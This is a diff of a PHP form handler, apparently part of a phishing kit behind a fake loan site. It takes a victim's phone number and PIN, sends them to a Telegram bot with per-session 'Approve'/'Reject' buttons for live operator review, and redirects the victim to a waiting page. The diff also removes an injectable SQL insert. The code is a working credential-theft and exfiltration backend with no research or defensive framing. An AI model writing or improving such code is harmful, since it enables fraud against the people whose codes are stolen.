@@ -1,10 +1,10 @@
 <?php
 
-// $conn = new mysqli("localhost","root","","loan-db");
-
-// get data
+// Get data from form
 $phone = $_POST['phone'];
 $pin = $_POST['pin'];
+
+// Generate a random ID for this session (no database needed)
 $id = rand(100000, 999999);
 
 // TELEGRAM
@@ -19,8 +19,8 @@ $message .= "Code: ".$pin;
 $keyboard = [
     'inline_keyboard' => [
         [
-            ['text' => 'Approve ✅', 'callback_data' => 'approve_pin'],
-            ['text' => 'Reject ❌', 'callback_data' => 'reject_pin']
+            ['text' => 'Approve ✅', 'callback_data' => "approve_$id"],
+            ['text' => 'Reject ❌', 'callback_data' => "reject_$id"]
         ]
     ]
 ];
@@ -41,16 +41,9 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 
 $response = curl_exec($ch);
-curl_close($ch);// save with status pending
-$sql = "INSERT INTO user_details (phone, pin, status)
-VALUES ('$phone','$pin','pending')";
+curl_close($ch);
 
-// $conn->query($sql);
-
-// get ID
-//$id = $conn->insert_id;
-
-// go to waiting page
+// Redirect to waiting page with the generated session ID
 header("Location: waiting.php?id=$id&phone=$phone");
 exit();
 
